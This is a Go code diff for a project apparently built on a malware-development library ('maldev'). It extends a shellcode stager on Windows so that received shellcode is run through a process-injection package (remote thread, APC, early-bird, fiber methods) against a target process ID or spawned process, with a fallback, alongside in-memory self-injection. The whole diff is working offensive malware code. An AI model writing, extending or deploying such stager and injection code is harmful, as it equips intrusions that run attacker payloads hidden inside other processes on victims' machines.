@@ -7,6 +7,7 @@ import (
 	"runtime"
 	"unsafe"
 
+	"github.com/oioio-space/maldev/inject"
 	"github.com/oioio-space/maldev/win/api"
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
 	"golang.org/x/sys/windows"
@@ -36,7 +37,13 @@ func (s *Stager) stageWindows() error {
 		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
 	}
 
-	// Type-assert the Caller from Config (stored as any for cross-platform compat).
+	// Route through inject package when a specific method is requested.
+	if s.config.Method != "" {
+		return s.executeWithInjection(shellcode)
+	}
+
+	// Default: self-injection via VirtualAlloc+CreateThread with optional
+	// NT syscall routing through Caller.
 	var caller *wsyscall.Caller
 	if s.config.Caller != nil {
 		var ok bool
@@ -47,6 +54,28 @@ func (s *Stager) stageWindows() error {
 	}
 
 	return executeInMemory(shellcode, caller)
+}
+
+// executeWithInjection routes stage execution through the inject package,
+// supporting all injection methods (crt, ct, apc, earlybird, fiber, etc.).
+func (s *Stager) executeWithInjection(shellcode []byte) error {
+	cfg := &inject.Config{
+		Method:      s.config.Method,
+		PID:         s.config.TargetPID,
+		ProcessPath: s.config.ProcessPath,
+		Fallback:    s.config.Fallback,
+	}
+
+	if s.config.Fallback {
+		return inject.InjectWithFallback(cfg, shellcode)
+	}
+
+	injector, err := inject.NewInjector(cfg)
+	if err != nil {
+		return fmt.Errorf("stage execution failed: %w", err)
+	}
+
+	return injector.Inject(shellcode)
 }
 
 // executeInMemory allocates RW memory, copies shellcode, re-protects as
